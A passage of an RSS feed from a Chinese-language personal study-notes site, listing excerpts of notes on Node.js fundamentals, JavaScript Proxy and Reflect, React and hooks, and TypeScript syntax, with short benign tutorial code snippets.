+0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/html5/javascript%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</guid><description>自学笔记 (pdf) #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/1.%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/1.%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90/</guid><description>参考：
https://www.runoob.com/nodejs/nodejs-http-server.html 第一个程序 # HelloWorld # 在 Mac 上直接使用下面的命令即可安装：
brew install node HelloWorld 程序，可以检测安装状态：
console.log(&amp;#34;Hello World&amp;#34;); 简单的 WEB 服务器 # 在我们创建 Node.js 第一个 &amp;ldquo;Hello, World!&amp;rdquo; 应用前，让我们先了解下 Node.js 应用是由哪几部分组成的：
**引入 required 模块：**我们可以使用 require 指令来载入 Node.js 模块。 **创建服务器：**服务器可以监听客户端的请求，类似于 Apache 、Nginx 等 HTTP 服务器。 **接收请求与响应请求：**服务器很容易创建，客户端可以使用浏览器或终端发送 HTTP 请求，服务器接收请求后返回响应数据。 代码如下：
var http = require(&amp;#39;http&amp;#39;); http.createServer(function (request, response) { // 发送 HTTP 头部 // HTTP 状态值: 200 : OK // 内容类型: text/plain response.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/10.%E5%87%BD%E6%95%B0%E4%B8%8E%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/10.%E5%87%BD%E6%95%B0%E4%B8%8E%E7%B1%BB/</guid><description>函数与类 # prototype # 简单地说，JavaScript 是基于原型的语言。
当我们调用一个对象的属性时，如果对象没有该属性，JavaScript 解释器就会从对象的原型对象上去找该属性，如果原型上也没有该属性，那就去找原型的原型，直到最后返回 null 为止，null没有原型。这种属性查找的方式被称为原型链（prototype chain）。
new # 当 js 语言执行 new 操作时具体时执行的什么操作呢？
创建一个空对象 u = {}
绑定原型，u.__proto__ = User.prototype 或 Objet.setPrototypeOf(u, User.prototype)；
调用 User() 函数，并把空对象 u 当做 this 传入，即 User.call(u)；
如果 User() 函数执行完自己 return 一个 object 类型，那么返回此变量，否则返回 this。
PS：如果构造函数返回基本类型值，则不影响，还是返回 this
箭头函数与普通函数 # 区别：
箭头函数不会创建自己的 this：它会从自己的作用域链上继承一个 this； 箭头函数的 this 永远不变：它的 this 在被定义时就已经确定了（call/apply/bind 都无法改变箭头函数的指向）； 箭头函数不能作为构造函数使用（本质是因为 this 无法改变）； 箭头函数没有自己的 argument，没有 prototype； 箭头函数不能使用 yeild 关键字；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/2.npm%E4%BB%8B%E7%BB%8D/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/2.npm%E4%BB%8B%E7%BB%8D/</guid><description>参考：
https://www.runoob.com/nodejs/nodejs-npm.html NPM # 介绍 # NPM 是随同 node.js 一起安装的包管理工具，能解决 node.js 代码部署上的很多问题。
常见的使用场景有以下几种：
允许用户从 NPM 服务器下载，别人编写的第三方包到本地使用。 允许用户从 NPM 服务器下载并安装，别人编写的命令行程序到本地使用。 允许用户将自己编写的包或命令行程序，上传到 NPM 服务器供别人使用。 通过查看版本信息，检测是否安装：
npm -v 如果你安装的是旧版本的 npm，可以很容易得通过 npm 命令来升级，命令如下：
sudo npm install npm -g 命令行使用方式 # 本地安装 # 以 express 为例，安装方式为：
npm install express 这种安装方式：
将安装包放在 ./node_modules 下（运行 npm 命令时所在的目录），如果没有 node_modules 目录，会在当前执行 npm 命令的目录下生成 node_modules 目录。 可以通过 require() 来引入本地安装的包。 全局安装 # 以 express 为例，安装方式为：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/3.repl/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/3.repl/</guid><description>Node.js REPL # 介绍 # Node.js REPL (Read Eval Print Loop: 交互式解释器) 表示一个电脑的环境，类似 Window 系统的终端或 Unix/Linux shell，我们可以在终端中输入命令，并接收系统的响应。
Node 自带了交互式解释器，可以执行以下任务：
读取 Read：读取用户输入，解析输入了Javascript 数据结构并存储在内存中。 执行 Eval：执行输入的数据结构 打印 Print：输出结果 循环 Loop：循环操作以上步骤直到用户两次按下 ctrl-c 按钮退出。 Node 的交互式解释器可以很好的调试 Javascript 代码。
学习 REPL # 我们可以输入以下命令来启动 Node 的终端：
node 这个终端内的运行效果跟 chrome 中的 console 中差异不大。
除了数值计算、函数、逻辑控制这些其他语言都具备的功能之外，以下特性值得学习：
下划线(_)变量：你可以使用下划线 _ 获取上一个表达式的运算结果： ctrl + c：退出当前终端。 ctrl + c 按下两次 / ctrl + d：退出 Node REPL。 :arrow_up:/:arrow_down:：查看输入的历史命令 tab 键：列出当前命令 .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/4.%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/4.%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</guid><description>回调函数 # 介绍 # Node.js 异步编程的直接体现就是回调。
异步编程依托于回调来实现，但不能说使用了回调后程序就异步化了。
回调函数在完成任务后就会被调用，Node 使用了大量的回调函数，Node 所有 API 都支持回调函数。
回调函数一般作为函数的最后一个参数出现：
function foo1(name, age, callback) { } function foo2(value, callback1, callback2) { } 阻塞代码（同步）实例 # 创建一个文件 test.txt ，内容如下：
laji shesl&amp;#39;s test case 创建 mainsync.js 文件, 代码如下：
var fs = require(&amp;#34;fs&amp;#34;); var data = fs.readFileSync(&amp;#39;test.txt&amp;#39;); console.log(data.toString()); console.log(&amp;#34;done!&amp;#34;); 以上代码执行结果如下：
$ node mainsync.js laji shesl&amp;#39;s test case Done!! 非阻塞代码（异步）实例 # 创建一个文件 testasync.txt ，内容如下：
laji shesl&amp;#39;s test case 创建 mainasync.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/5.%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/5.%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/</guid><description>参考：
https://www.runoob.com/nodejs/nodejs-event-loop.html
https://zhuanlan.zhihu.com/p/37427130
事件循环 # 简介 # Node.js 是单进程单线程应用程序，那么它是如何实现异步调用的呢？
它维护了六个 FIFO 队列，分别表示不同的功能的函数：
┌───────────────────────────┐ ┌─&amp;gt;│ timers │ │ └─────────────┬─────────────┘ │ ┌─────────────┴─────────────┐ │ │ pending callbacks │ │ └─────────────┬─────────────┘ │ ┌─────────────┴─────────────┐ │ │ idle, prepare │ │ └─────────────┬─────────────┘ ┌───────────────┐ │ ┌─────────────┴─────────────┐ │ incoming: │ │ │ poll │&amp;lt;─────┤ connections, │ │ └─────────────┬─────────────┘ │ data, etc. │ │ ┌─────────────┴─────────────┐ └───────────────┘ │ │ check │ │ └─────────────┬─────────────┘ │ ┌─────────────┴─────────────┐ └──┤ close callbacks │ └───────────────────────────┘ 然后它的单线程只执行一个 while 循环，一直跑这六个的头部任务，直到队列为空或者执行时间到达上限。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/6.eventemitter/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/6.eventemitter/</guid><description>参考：
https://www.runoob.com/nodejs/nodejs-event.html EventEmitter # Node.js 所有的异步 I/O 操作在完成时都会发送一个事件到事件队列。
Node.js 里面的许多对象都会分发事件：一个 net.Server 对象会在每次有新连接时触发一个事件， 一个 fs.readStream 对象会在文件被打开的时候触发一个事件。
所有这些产生事件的对象都是 events.EventEmitter 的实例。
它被定义在 events，这个模块中：
var events = require(&amp;#39;events&amp;#39;); 这个模块只定义了一个对象 events.EventEmitter，它的核心就是事件触发与事件监听器功能的封装：
var eventEmitter = new events.EventEmitter(); 下面一个简单的例子阐述事件的监听和出发过程：
//event.js 文件 var events = require(&amp;#39;events&amp;#39;); var emitter = new events.EventEmitter(); emitter.on(&amp;#39;someEvent&amp;#39;, function(arg1, arg2) { console.log(&amp;#39;listener1&amp;#39;, arg1, arg2); }); emitter.on(&amp;#39;someEvent&amp;#39;, function(arg1, arg2) { console.log(&amp;#39;listener2&amp;#39;, arg1, arg2); }); emitter.emit(&amp;#39;someEvent&amp;#39;, &amp;#39;strArg1&amp;#39;, &amp;#39;strArg2&amp;#39;); $ node events.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/7.buffer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/7.buffer/</guid><description>参考：
https://www.runoob.com/nodejs/nodejs-buffer.html Buffer # 概述 # JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。因此在 Node.js 中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。一个 Buffer 类似于一个整数数组，但它对应于 V8 堆内存之外的一块原始内存。
下面介绍一些常见的用法。完整的请参考官方文档。
编码与解码 # 将字符串转化为二进制数据的过程叫编码：
const buf = Buffer.from(&amp;#39;runoob&amp;#39;, &amp;#39;ascii&amp;#39;); 将二进制数据转化为字符串的过程叫解码：
console.log(buf.toString(&amp;#39;hex&amp;#39;)); // 输出 72756e6f6f62 Node.js 目前支持的字符编码包括：
ascii：仅支持 7 位 ASCII 数据。如果设置去掉高位的话，这种编码是非常快的。 utf8：多字节编码的 Unicode 字符。许多网页和其他文档格式都使用 UTF-8 。 utf16le/ucs2：2 或 4 个字节，小字节序编码的 Unicode 字符。支持代理对（U+10000 至 U+10FFFF）。 base64：Base64 编码。 latin1/binary：一种把 Buffer 编码成一字节编码的字符串的方式。 hex：将每个字节编码为两个十六进制字符。 创建 Buffer 类 # Buffer 提供了以下 API 来创建 Buffer 类：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/8.stream/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/8.stream/</guid><description>Stream # 概述 # Stream 是一个抽象接口，Node 中有很多对象实现了这个接口。例如，对 http 服务器发起请求的 request 对象就是一个 Stream，还有 stdout（标准输出）也是一个 Stream。
Node.js，Stream 有四种流类型：
Readable：可读操作。 Writable：可写操作。 Duplex：可读可写操作. Transform：操作被写入数据，然后读出结果。 所有的 Stream 对象都是 EventEmitter 的实例。常用的事件有：
data：当有数据可读时触发。 end：没有更多的数据可读时触发。 error：在接收和写入过程中发生错误时触发。 finish：所有数据已被写入到底层系统时触发。 从流中读取数据 # 读取的基本方法是：通过监听 data 事件，数据会在回调函数的参数中回传。
一个示例程序如下：
var fs = require(&amp;#34;fs&amp;#34;); var data = &amp;#39;&amp;#39;; var readerStream = fs.createReadStream(&amp;#39;test.txt&amp;#39;); readerStream.setEncoding(&amp;#39;UTF8&amp;#39;); // 处理流事件 --&amp;gt; data, end, and error readerStream.on(&amp;#39;data&amp;#39;, chunk =&amp;gt; { data += chunk; }); readerStream.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/9.%E6%A8%A1%E5%9D%97%E7%B3%BB%E7%BB%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/9.%E6%A8%A1%E5%9D%97%E7%B3%BB%E7%BB%9F/</guid><description>模块系统 # 概述 # 为了让 Node.js 的文件可以相互调用，Node.js 提供了一个简单的模块系统。
模块是 Node.js 应用程序的基本组成部分，文件和模块是一一对应的。换言之，一个 Node.js 文件就是一个模块，这个文件可能是 JavaScript 代码、JSON 或者编译过的C/C++ 扩展。
创建模块 # 创建一个模块非常简单，举个例子。
创建一个叫 hello 的模块，只需要创建 hello.js 文件，代码如下：
exports.world = () =&amp;gt; { console.log(&amp;#39;Hello World&amp;#39;); } 这样，其他文件包含这个文件时，就可以访问到 world 这个函数了。
如果我们希望直接封装一个对象，可以直接给 module.exports 这个变量赋值。比如：
function Hello() { var name; this.setName = thyName =&amp;gt; { name = thyName; }; }; module.exports = Hello; js 模块的编译在编译的过程中，Node 对获取的 javascript 文件内容进行了头尾包装，将文件内容包装在一个 function 中：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/nodemodules/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/nodemodules/</guid><description>参考：
https://www.zhihu.com/question/62791509 https://redfin.engineering/node-modules-at-war-why-commonjs-and-es-modules-cant-get-along-9617135eeca1 Commonjs vs ES Modules # What’s CJS? What’s ESM? # 在 Node 模块的早期，所有的 Node Module 都是用 Common.js 编写的。我们可以从 named export 与 default export 两种方式简单地了解它的使用规则：
named export： // @filename: util.cjs module.exports.sum = (x, y) =&amp;gt; x + y; // @filename: main.cjs const {sum} = require(&amp;#39;./util.cjs&amp;#39;); default export： // @filename: util.cjs module.exports = (x, y) =&amp;gt; x + y; // @filename: main.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/proxy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/proxy/</guid><description> 参考资料：
https://zhuanlan.zhihu.com/p/75407419 https://zhuanlan.zhihu.com/p/69106037 Proxy # 实例 # 直接看一个例子：
let target = { x: 10, y: 20, }; let hanler = { get: (obj, prop) =&amp;gt; 42 }; target = new Proxy(target, hanler); target.x; //42 target.y; //42</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reactjs/1.react%E5%9F%BA%E7%A1%80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reactjs/1.react%E5%9F%BA%E7%A1%80/</guid><description>React 基础 # 从原生到 React # 原生例子 # 一个 demo，如何用原生的 JavaScript 实现一个点赞按钮（即简单的点击一次更换一次图片）。
// 将点赞按钮可复用地组件化 class LikeStar { constructor() { this.state = { isLiked: false; } this.redStarSrc = URL_OF_RED_STAR; this.whiteStarSrc = URL_OF_WHITE_STAR; } changeStar = () =&amp;gt; { this.state.isLiked = !this.state.isLiked; const imgSrc = this.state.isLiked ? this.redStarSrc : this.whiteStarSrc; const $star = this.el.querySelector(&amp;#39;.js-star&amp;#39;); // 其中 js-star 是 img 标签的一个 class $star.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reactjs/2.react%E8%BF%9B%E9%98%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reactjs/2.react%E8%BF%9B%E9%98%B6/</guid><description>React 进阶 # Context # Context 是 React 中比较特殊的对象，是一种组件中传值的特殊方式。
因为 React 中的数据流向是单向的，所以如果需要在层级很深的组件树中传值的话，需要不断地从 props 中向下传值，Context 则解决了这个问题（不同层级的组件需要访问同样一些数据）。
React 相关 API：
API 作用 React.createContext 创建一个 Context 对象，接收一个“默认值”作为参数 Context.Provider 一个 React 组件，接受一个 value 的属性值。被这个组件包裹的子组件都可以使用这个属性值。 contextType 将一个组件的 static 属性 contextType 设置为对应的 Context 对象，即可在这个组件内部的任意生命周期函数中，通过 this.context 访问到 Provider 提供的属性值。 Context.Cosumer 一个 React 组件，接受一个函数作为其包裹的内容，函数的参数即为 Provider 的 value 值。 注意事项：
context 的默认值，只有在 Cosumer 的外层没有 Provider 包裹的时候使用； Provider 支持多层嵌套； 消费组件的更新只取决于 Provider 是否更新，不会执行 shouldComponentUpdate； 高阶组件 # 定义：高阶组件（high order components）是参数为组件且返回值也为组件的函数。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reactjs/hooks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reactjs/hooks/</guid><description>参考文档：
https://zh-hans.reactjs.org/docs/hooks-intro https://www.yuque.com/qianduanyongbuweinu/efahmp/vasyzy#8OGwa Hooks # 例子 # 与 Hooks 相关的 API 都是 use 开头的，它返回一个元组。以 useState 为例，它返回第一个元素即这个状态，第二个元素是设置这个状态的函数。
先看一个 useState 使用的例子：
export const MyComponent: React.FC = () =&amp;gt; { const [st, setSt] = useState&amp;lt;bool&amp;gt;(false); return ( &amp;lt;div&amp;gt; &amp;lt;button onClick={setSt} /&amp;gt; &amp;lt;span&amp;gt;{st}&amp;lt;/span&amp;gt; &amp;lt;/div&amp;gt; ) } 另一个常见的 Hooks 函数即 useEffect，类似于 OOP 中的 componentDidMount 与 componentDidUpdate：
export const MyComponent: React.FC = () =&amp;gt; { const [count, setCount] = useState(0); useEffect(() =&amp;gt; { document.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reflect/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reflect/</guid><description>https://es6.ruanyifeng.com/#docs/reflect
Reflect # 概述 # Reflect对象与Proxy对象一样，也是 ES6 为了操作对象而提供的新 API。Reflect对象的设计目的有这样几个：
将 Object 对象的一些明显属于语言内部的方法（比如 Object.defineProperty），放到 Reflect 对象上。现阶段，某些方法同时在 Object 和 Reflect 对象上部署，未来的新方法将只部署在 Reflect 对象上。也就是说，从 Reflect 对象上可以拿到语言内部的方法。 修改某些 Object 方法的返回结果，让其变得更合理。比如，Object.defineProperty(obj, name, desc) 在无法定义属性时，会抛出一个错误，而 Reflect.defineProperty(obj, name, desc) 则会返回 false。 让 Object 操作都变成函数行为。某些 Object 操作是命令式，比如 name in obj 和 delete obj[name]，而 Reflect.has(obj, name) 和 Reflect.deleteProperty(obj, name) 让它们变成了函数行为。 Reflect 对象的方法与 Proxy 对象的方法一一对应，只要是 Proxy 对象的方法，就能在 Reflect 对象上找到对应的方法。这就让 Proxy 对象可以方便地调用对应的 Reflect 方法，完成默认行为，作为修改行为的基础。也就是说，不管 Proxy 怎么修改默认行为，你总可以在 Reflect 上获取默认行为。 MetaData # API 详见：https://www.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/stackoverflow/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/stackoverflow/</guid><description>Stack Overflow # 来自 StackOverflow 上的大神教程。
如何得到一个类派生出的所有子类型：https://stackoverflow.com/questions/42414045/how-to-get-child-classes-which-implement-a-certain-base-class-using-reflection-i
export default function hierarchyTracked(target: new (...args: any[]) =&amp;gt; object) { for (const proto of walkPrototypeChain(target)) { if (!Object.hasOwnProperty.call(proto, &amp;#39;extendedBy&amp;#39;)) { const extendedBy: typeof Function.extendedBy = []; Object.defineProperty(proto, &amp;#39;extendedBy&amp;#39;, { get: () =&amp;gt; extendedBy }); } // ! is used to suppress a strictNullChecks error on optional. // This is OK since we know it is now defined.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/trick/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/trick/</guid><description>Trick # 定义 getter setter，在类方法前使用关键字 get/set；
https://www.typescriptlang.org/docs/handbook/classes.html#accessors 使用 @ 符号，引用 Decorator：
https://www.typescriptlang.org/docs/handbook/decorators.html#property-decorators 使用模版字符串：
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E5%85%B6%E4%BB%96/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E5%85%B6%E4%BB%96/</guid><description>Mixin # Mixin 本身是一种设计模式，它指不通过继承而是通过混入，将一个类的方法添加到另一个类中。这通常用于解决多继承的问题（一个子类不能同时继承两个基类）。
TypeScript 官方文档给出了一个 mixin 的方法：https://www.typescriptlang.org/docs/handbook/mixins.html：
// Each mixin is a traditional ES class class Jumpable { jump() {} } class Duckable { duck() {} } // Including the base class Sprite { x = 0; y = 0; } // Then you create an interface which merges // the expected mixins with the same name as your base interface Sprite extends Jumpable, Duckable {} // Apply the mixins into the base class via // the JS at runtime applyMixins(Sprite, [Jumpable, Duckable]); let player = new Sprite(); player.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</guid><description>内置类型 # 类型是 TypeScript 相较于 JavaScript 增加的特性，也是 TpyeScript 的重点内容。
变量声明 # 声明变量的类型及初始值：
var [变量名] : [类型] = 值; **注意：**变量不要使用 name 否则会与 DOM 中的全局 window 对象下的 name 属性出现了重名。
类型断言（C++ 中的强制类型转换，但并不完全是）：
&amp;lt;类型&amp;gt; 值 值 as 类型 当 S 类型是 T 类型的子集，或者 T 类型是 S 类型的子集时，S 能被成功断言成 T。这是为了在进行类型断言时提供额外的安全性，完全毫无根据的断言是危险的，如果你想这么做，你可以使用 any。
它之所以不被称为类型转换，是因为转换通常意味着某种运行时的支持。但是，类型断言纯粹是一个编译时语法，同时，它也是一种为编译器提供关于如何分析代码的方法。
类型推断（C++ 中的 auto）：使用 var 关键字。
Any 类型 # 任意值是 TypeScript 针对编程时类型不明确的变量使用的一种数据类型，类型核心在于不在编译时进行类型检查。
let x: any = 1; x = &amp;#39;I am who I am&amp;#39;; // 正确，Any 可以指向任意类型 x.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/2.%E6%8E%A7%E5%88%B6%E6%B5%81/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/2.%E6%8E%A7%E5%88%B6%E6%B5%81/</guid><description>控制流 # 条件判断 # 循环 # 函数 # 参数类型 # 函数可以指定返回值类型与参数类型，比如：
function add(x: number, y: number): string { // ... } 上面定义的是两个 number 类型为参数，一个 string 类型为返回值的函数。 函数重载 # 可以通过参数类型对相同函数名进行重：
function disp(string):void; function disp(number):void;</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/3.%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/3.%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B/</guid><description>内置类型 # Number # 概述 # TypeScript 与 JavaScript 类似，支持 Number 对象。Number 对象是原始数值的包装对象。
对象属性 # Number 对象支持的属性：
MAX_VALUE、MIN_VALUE、NaN、NEGATIVE_INFINITY、POSITIVE_INFINITY prototype、constructor； 对象方法 # 序号 方法 &amp;amp; 描述 1. toExponential()：把对象的值转换为指数计数法。 2. toFixed()：把数字转换为字符串，并对小数点指定位数。 3. toLocaleString()：把数字转换为字符串，使用本地数字格式顺序。 4. toPrecision()：把数字格式化为指定的长度。 5. toString()：把数字转换为字符串，使用指定的基数。数字的基数是 2 ~ 36 之间的整数。若省略该参数，则使用基数 10。 6. valueOf()：返回一个 Number 对象的原始数字值。 String # 对象属性 # String 对象支持的属性：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/4.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/4.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</guid><description>面向对象 # 接口 # TypeScript 接口定义如下：
